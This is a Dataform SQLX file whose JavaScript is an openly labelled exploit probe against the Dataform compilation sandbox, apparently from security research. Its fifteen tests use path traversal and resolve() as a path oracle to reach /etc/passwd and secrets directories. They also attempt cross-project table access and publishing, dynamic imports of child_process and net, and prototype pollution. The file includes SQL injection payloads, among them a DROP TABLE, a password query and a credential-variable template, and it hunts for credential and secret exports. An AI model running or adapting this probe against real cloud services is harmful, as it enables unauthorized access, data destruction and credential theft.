config { type: "view", name: "resolve_deep_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Deep exploitation of resolve() function - path oracle, CWD discovery, cross-project access"
  };

  // =============================================================================
  // TEST 1: Discover Current Working Directory
  // =============================================================================
  results.test1_cwdDiscovery = {};
  try {
    const cwdMethods = {};

    // Try various ways to get CWD
    if (typeof process !== 'undefined') {
      try { cwdMethods.processCwd = process.cwd(); } catch(e) { cwdMethods.processCwd = e.message; }
      try { cwdMethods.processEnvPWD = process.env.PWD; } catch(e) { cwdMethods.processEnvPWD = e.message; }
    }

    if (typeof __dirname !== 'undefined') cwdMethods.__dirname = __dirname;
    if (typeof __filename !== 'undefined') cwdMethods.__filename = __filename;

    // Check module paths
    if (typeof module !== 'undefined') {
      cwdMethods.moduleFilename = module.filename;
      cwdMethods.modulePath = module.path;
      cwdMethods.modulePaths = module.paths?.slice(0, 5);
    }

    // Check require.main
    if (typeof require !== 'undefined' && require.main) {
      cwdMethods.requireMainFilename = require.main.filename;
      cwdMethods.requireMainPath = require.main.path;
    }

    // Dataform-specific paths
    if (typeof dataform !== 'undefined') {
      cwdMethods.dataformRootDir = dataform.rootDir;
      cwdMethods.dataformRootDirType = typeof dataform.rootDir;
      cwdMethods.dataformRootDirLength = dataform.rootDir?.length;
    }

    results.test1_cwdDiscovery = {
      status: "completed",
      cwdMethods
    };
  } catch(e) {
    results.test1_cwdDiscovery = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: resolve() Function Signature Analysis
  // =============================================================================
  results.test2_resolveSig = {};
  try {
    if (typeof resolve !== 'function') {
      results.test2_resolveSig = { error: "resolve not available" };
    } else {
      const sigAnalysis = {
        length: resolve.length,
        name: resolve.name,
        toString: resolve.toString().substring(0, 500)
      };

      // Test with different argument counts
      const argTests = {};
      try { argTests.noArgs = resolve(); } catch(e) { argTests.noArgs = "Error: " + e.message.substring(0, 100); }
      try { argTests.oneArg = resolve('test'); } catch(e) { argTests.oneArg = "Error: " + e.message.substring(0, 100); }
      try { argTests.twoArgs = resolve('test', ''); } catch(e) { argTests.twoArgs = "Error: " + e.message.substring(0, 100); }
      try { argTests.threeArgs = resolve('test', '', 'extra'); } catch(e) { argTests.threeArgs = "Error: " + e.message.substring(0, 100); }

      sigAnalysis.argTests = argTests;

      results.test2_resolveSig = {
        status: "completed",
        sigAnalysis
      };
    }
  } catch(e) {
    results.test2_resolveSig = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: resolve() as Path Oracle - Enumerate Valid Paths
  // =============================================================================
  results.test3_pathOracle = {};
  try {
    const oracleResults = {};

    // Test known-valid paths (our own files)
    const knownPaths = [
      'simple_test',
      'resolve_deep_exploit',
      'dataform_internals_probe',
      'env_deep_probe',
      'definitions/simple_test',
      './simple_test',
      'index'
    ];

    for (const p of knownPaths) {
      try {
        const result = resolve(p);
        oracleResults[p] = {
          result: String(result),
          length: String(result).length,
          isEmpty: result === '' || result === undefined || result === null,
          type: typeof result
        };
      } catch(e) {
        oracleResults[p] = { error: e.message.substring(0, 100) };
      }
    }

    results.test3_pathOracle = {
      status: "completed",
      oracleResults
    };
  } catch(e) {
    results.test3_pathOracle = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: resolve() with Various currentDir Values
  // =============================================================================
  results.test4_currentDirVariations = {};
  try {
    const variations = {};

    const testPath = 'simple_test';
    const currentDirs = [
      undefined,
      null,
      '',
      '.',
      '..',
      '/',
      'definitions',
      './definitions',
      '../definitions',
      'definitions/',
      '/definitions',
      '/tmp',
      '/etc',
      '/home',
      '/root',
      '/var/run/secrets',
      process?.cwd?.() || '.',
      dataform?.rootDir || ''
    ];

    for (const dir of currentDirs) {
      const key = dir === undefined ? 'undefined' : dir === null ? 'null' : String(dir) || '(empty)';
      try {
        const result = resolve(testPath, dir);
        variations[key] = {
          result: String(result).substring(0, 200),
          length: String(result).length,
          type: typeof result
        };
      } catch(e) {
        variations[key] = { error: e.message.substring(0, 100) };
      }
    }

    results.test4_currentDirVariations = {
      status: "completed",
      variations
    };
  } catch(e) {
    results.test4_currentDirVariations = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: Path Traversal Depth Enumeration
  // =============================================================================
  results.test5_traversalDepth = {};
  try {
    const depthResults = {};

    // Test increasing depths of traversal
    for (let depth = 1; depth <= 15; depth++) {
      const traversal = '../'.repeat(depth);
      const testPaths = [
        traversal + 'package.json',
        traversal + 'dataform.json',
        traversal + 'workflow_settings.yaml',
        traversal + 'definitions/simple_test'
      ];

      depthResults['depth_' + depth] = {};
      for (const p of testPaths) {
        try {
          const result = resolve(p);
          depthResults['depth_' + depth][p.split('/').pop()] = {
            result: String(result).substring(0, 100),
            nonEmpty: result !== '' && result !== undefined
          };
        } catch(e) {
          depthResults['depth_' + depth][p.split('/').pop()] = { error: e.message.substring(0, 50) };
        }
      }
    }

    results.test5_traversalDepth = {
      status: "completed",
      depthResults
    };
  } catch(e) {
    results.test5_traversalDepth = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: ref() Cross-Project Access
  // =============================================================================
  results.test6_refCrossProject = {};
  try {
    if (typeof ref !== 'function') {
      results.test6_refCrossProject = { error: "ref not available" };
    } else {
      const crossProjectTests = {};

      // Try referencing tables in other projects
      const testRefs = [
        // Our project
        'simple_test',
        'dataform_poc.simple_test',
        'shir-research-3.dataform_poc.simple_test',

        // Other potential projects (common names)
        'bigquery-public-data.samples.shakespeare',
        'bigquery-public-data.usa_names.usa_1910_current',
        'cloudresourcemanager.projects',

        // System tables
        'INFORMATION_SCHEMA.TABLES',
        'INFORMATION_SCHEMA.SCHEMATA',
        'INFORMATION_SCHEMA.COLUMNS',
        'shir-research-3.INFORMATION_SCHEMA.TABLES',
        'shir-research-3.INFORMATION_SCHEMA.SCHEMATA',
        'shir-research-3.region-us.INFORMATION_SCHEMA.TABLES',

        // Metadata tables
        '__TABLES__',
        'dataform_poc.__TABLES__',
        'shir-research-3.dataform_poc.__TABLES__',

        // Path traversal in ref
        '../other_dataset.table',
        '../../other_project.dataset.table'
      ];

      for (const r of testRefs) {
        try {
          const result = ref(r);
          crossProjectTests[r] = {
            success: true,
            result: String(result).substring(0, 200)
          };
        } catch(e) {
          crossProjectTests[r] = {
            success: false,
            error: e.message.substring(0, 100)
          };
        }
      }

      results.test6_refCrossProject = {
        status: "completed",
        crossProjectTests
      };
    }
  } catch(e) {
    results.test6_refCrossProject = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: publish() Function Exploitation
  // =============================================================================
  results.test7_publishExploit = {};
  try {
    if (typeof publish !== 'function') {
      results.test7_publishExploit = { error: "publish not available" };
    } else {
      const publishTests = {};

      // Analyze publish function
      publishTests.signature = {
        length: publish.length,
        toString: publish.toString().substring(0, 500)
      };

      // Try publish with various inputs
      try {
        // Can we publish to other projects?
        const maliciousPublish = publish("malicious_table", {
          database: "other-project",
          schema: "other_dataset"
        });
        publishTests.crossProjectPublish = {
          success: true,
          result: typeof maliciousPublish,
          keys: maliciousPublish ? Object.keys(maliciousPublish).slice(0, 10) : null
        };
      } catch(e) {
        publishTests.crossProjectPublish = { error: e.message.substring(0, 100) };
      }

      results.test7_publishExploit = {
        status: "completed",
        publishTests
      };
    }
  } catch(e) {
    results.test7_publishExploit = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Dynamic import() - ES Module Bypass
  // =============================================================================
  results.test8_dynamicImport = {};
  try {
    const importTests = {};

    // Check if import is available
    importTests.importType = typeof import;

    // Try dynamic import
    const modules = ['fs', 'child_process', 'net', 'http', 'os', 'path', 'vm'];

    for (const mod of modules) {
      try {
        // Note: This is async, results may not be captured
        const importPromise = eval(`import('${mod}')`);
        if (importPromise && typeof importPromise.then === 'function') {
          importTests[mod] = { type: 'promise', status: 'returned promise' };
        } else {
          importTests[mod] = { type: typeof importPromise, value: String(importPromise).substring(0, 100) };
        }
      } catch(e) {
        importTests[mod] = { error: e.message.substring(0, 100) };
      }
    }

    // Check import.meta
    try {
      const meta = eval('import.meta');
      importTests.importMeta = { available: true, keys: Object.keys(meta) };
    } catch(e) {
      importTests.importMeta = { error: e.message.substring(0, 100) };
    }

    results.test8_dynamicImport = {
      status: "completed",
      importTests
    };
  } catch(e) {
    results.test8_dynamicImport = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 9: SQL Injection via Template Escape
  // =============================================================================
  results.test9_sqlInjection = {};
  try {
    const injectionTests = {};

    // Test if we can break out of SQL strings
    const payloads = [
      "'; DROP TABLE test; --",
      "` + (SELECT password FROM users) + `",
      "${process.env.GOOGLE_APPLICATION_CREDENTIALS}",
      "\\'; SELECT * FROM INFORMATION_SCHEMA.TABLES; --",
      "' UNION SELECT * FROM `shir-research-3.INFORMATION_SCHEMA.TABLES` --"
    ];

    for (let i = 0; i < payloads.length; i++) {
      const payload = payloads[i];
      injectionTests['payload_' + i] = {
        original: payload.substring(0, 50),
        // See how it gets handled in output
        asString: JSON.stringify(payload),
        length: payload.length
      };
    }

    results.test9_sqlInjection = {
      status: "completed",
      injectionTests,
      note: "Payloads are stored for analysis - actual injection would be in SQL output"
    };
  } catch(e) {
    results.test9_sqlInjection = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 10: Action Enumeration via indexedActions
  // =============================================================================
  results.test10_actionEnum = {};
  try {
    if (!dataform || !dataform.indexedActions) {
      results.test10_actionEnum = { error: "indexedActions not available" };
    } else {
      const indexed = dataform.indexedActions;
      const enumResults = {};

      // Get all action keys
      let keys;
      if (indexed instanceof Map) {
        keys = [...indexed.keys()];
      } else {
        keys = Object.keys(indexed);
      }

      enumResults.totalActions = keys.length;
      enumResults.actionNames = keys.slice(0, 50);

      // Analyze action targets for cross-project references
      enumResults.actionTargets = [];
      for (const key of keys.slice(0, 20)) {
        const action = indexed instanceof Map ? indexed.get(key) : indexed[key];
        if (action && action.proto && action.proto.target) {
          enumResults.actionTargets.push({
            key,
            database: action.proto.target.database,
            schema: action.proto.target.schema,
            name: action.proto.target.name
          });
        }
      }

      results.test10_actionEnum = {
        status: "completed",
        enumResults
      };
    }
  } catch(e) {
    results.test10_actionEnum = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 11: preOps/postOps Injection
  // =============================================================================
  results.test11_opsInjection = {};
  try {
    const opsTests = {};

    // Check if preOps/postOps are available
    opsTests.preOpsType = typeof preOps;
    opsTests.postOpsType = typeof postOps;

    if (typeof preOps === 'function') {
      opsTests.preOpsSignature = {
        length: preOps.length,
        toString: preOps.toString().substring(0, 300)
      };

      // Try calling preOps with SQL injection
      try {
        preOps("SELECT * FROM INFORMATION_SCHEMA.TABLES");
        opsTests.preOpsCall = "success - called without error";
      } catch(e) {
        opsTests.preOpsCall = e.message.substring(0, 100);
      }
    }

    if (typeof postOps === 'function') {
      opsTests.postOpsSignature = {
        length: postOps.length,
        toString: postOps.toString().substring(0, 300)
      };
    }

    results.test11_opsInjection = {
      status: "completed",
      opsTests
    };
  } catch(e) {
    results.test11_opsInjection = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 12: require.resolve() Path Leakage
  // =============================================================================
  results.test12_requireResolve = {};
  try {
    if (typeof require === 'undefined' || typeof require.resolve !== 'function') {
      results.test12_requireResolve = { error: "require.resolve not available" };
    } else {
      const resolveTests = {};

      // require.resolve() returns the full path to a module
      const modulesToResolve = [
        '@dataform/core',
        'path',
        'fs',
        'child_process',
        './simple_test',
        '../package.json',
        '/etc/passwd',
        '.'
      ];

      for (const mod of modulesToResolve) {
        try {
          const resolved = require.resolve(mod);
          resolveTests[mod] = {
            success: true,
            path: resolved
          };
        } catch(e) {
          resolveTests[mod] = {
            success: false,
            error: e.message.substring(0, 100)
          };
        }
      }

      // Get module paths
      resolveTests.modulePaths = require.resolve.paths?.('@dataform/core');

      results.test12_requireResolve = {
        status: "completed",
        resolveTests
      };
    }
  } catch(e) {
    results.test12_requireResolve = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 13: Prototype Pollution Attempt
  // =============================================================================
  results.test13_protoPollution = {};
  try {
    const pollutionTests = {};

    // Check current state
    pollutionTests.before = {
      objectPolluted: ({}).polluted,
      arrayPolluted: ([]).polluted
    };

    // Attempt pollution through various vectors
    try {
      const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
      pollutionTests.jsonParsePollution = ({}).polluted;
    } catch(e) {
      pollutionTests.jsonParseError = e.message.substring(0, 100);
    }

    // Check if Object.prototype is frozen
    pollutionTests.objectPrototypeFrozen = Object.isFrozen(Object.prototype);
    pollutionTests.arrayPrototypeFrozen = Object.isFrozen(Array.prototype);

    results.test13_protoPollution = {
      status: "completed",
      pollutionTests
    };
  } catch(e) {
    results.test13_protoPollution = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 14: Timing-based Path Oracle
  // =============================================================================
  results.test14_timingOracle = {};
  try {
    const timingResults = {};

    const testPaths = [
      '/etc/passwd',           // Likely doesn't exist in sandbox
      '/tmp',                  // Might exist
      'simple_test',           // Known to exist
      'nonexistent_file_xyz',  // Definitely doesn't exist
      '../../../etc/passwd',
      '../../../../etc/passwd'
    ];

    for (const p of testPaths) {
      const start = Date.now();
      for (let i = 0; i < 100; i++) {
        try { resolve(p); } catch(e) {}
      }
      const elapsed = Date.now() - start;

      timingResults[p] = {
        elapsed,
        avgMs: elapsed / 100
      };
    }

    results.test14_timingOracle = {
      status: "completed",
      timingResults,
      note: "Timing differences might indicate path existence"
    };
  } catch(e) {
    results.test14_timingOracle = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 15: Dataform Session Deep Dive
  // =============================================================================
  results.test15_sessionDeep = {};
  try {
    const sessionInfo = {};

    // Check @dataform/core exports more thoroughly
    try {
      const dfCore = require('@dataform/core');
      sessionInfo.dfCoreKeys = Object.keys(dfCore);

      // Look for session-related exports
      for (const key of Object.keys(dfCore)) {
        if (/session|config|project|credential|auth|key|secret/i.test(key)) {
          sessionInfo['dfCore_' + key] = {
            type: typeof dfCore[key],
            value: typeof dfCore[key] === 'string' ?
              dfCore[key].substring(0, 100) :
              (typeof dfCore[key] === 'object' ? Object.keys(dfCore[key] || {}).slice(0, 5) : dfCore[key])
          };
        }
      }
    } catch(e) {
      sessionInfo.dfCoreError = e.message.substring(0, 100);
    }

    // Check for session in global
    if (typeof session !== 'undefined') {
      sessionInfo.globalSession = {
        type: typeof session,
        keys: typeof session === 'object' ? Object.keys(session).slice(0, 10) : null
      };
    }

    results.test15_sessionDeep = {
      status: "completed",
      sessionInfo
    };
  } catch(e) {
    results.test15_sessionDeep = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 15,
    completedTests: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Analyze findings
  if (results.test1_cwdDiscovery?.cwdMethods) {
    const cwd = results.test1_cwdDiscovery.cwdMethods;
    if (cwd.processCwd || cwd.__dirname || cwd.moduleFilename) {
      results.summary.criticalFindings.push("CWD DISCOVERED: " +
        (cwd.processCwd || cwd.__dirname || cwd.moduleFilename));
    }
  }

  if (results.test6_refCrossProject?.crossProjectTests) {
    const tests = results.test6_refCrossProject.crossProjectTests;
    const successful = Object.entries(tests).filter(([k, v]) => v.success && !k.includes('simple_test'));
    if (successful.length > 0) {
      results.summary.criticalFindings.push("CROSS-PROJECT REF WORKED: " + successful.length + " refs");
    }
  }

  if (results.test12_requireResolve?.resolveTests) {
    const tests = results.test12_requireResolve.resolveTests;
    const leaked = Object.entries(tests).filter(([k, v]) => v.success && v.path);
    if (leaked.length > 0) {
      results.summary.criticalFindings.push("PATHS LEAKED via require.resolve: " +
        leaked.map(([k, v]) => v.path).join(', ').substring(0, 100));
    }
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as resolve_deep_exploit
